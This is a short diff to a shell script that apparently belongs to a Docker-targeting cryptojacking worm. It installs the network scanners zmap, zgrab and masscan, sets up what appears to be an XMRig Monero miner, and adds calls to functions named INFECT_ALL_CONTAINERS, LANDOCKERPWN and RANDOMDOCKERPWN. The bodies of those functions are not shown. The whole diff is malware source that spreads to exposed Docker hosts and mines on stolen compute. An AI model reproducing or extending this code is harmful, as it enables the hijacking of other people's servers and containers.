@@ -14,11 +14,16 @@ function INIT_MAIN(){
     SETUP_ZMAP
     SETUP_ZGRAB
     SETUP_MSCAN
-    /usr/local/bin/setup_xmrig.sh
+    SETUP_XMR
+    INFECT_ALL_CONTAINERS
+    GETLOCALRANGES
+    AUTOLANDOCKERPWN
+    LANDOCKERPWN
+    RANDOMDOCKERPWN
 
 }
 
-SETUP_BASICS() {
+function SETUP_BASICS() {
     # Update package index
     apk update
     apk add --no-cache \
@@ -88,6 +93,10 @@ chmod +x /usr/bin/zgrab
 function SETUP_MSCAN(){
     apk update
     apk add git gcc make musl-dev libpcap-dev linux-headers masscan
+}
+
+function SETUP_XMR(){
+/usr/local/bin/setup_xmrig.sh
 }
 
 function INFECT_ALL_CONTAINERS(){
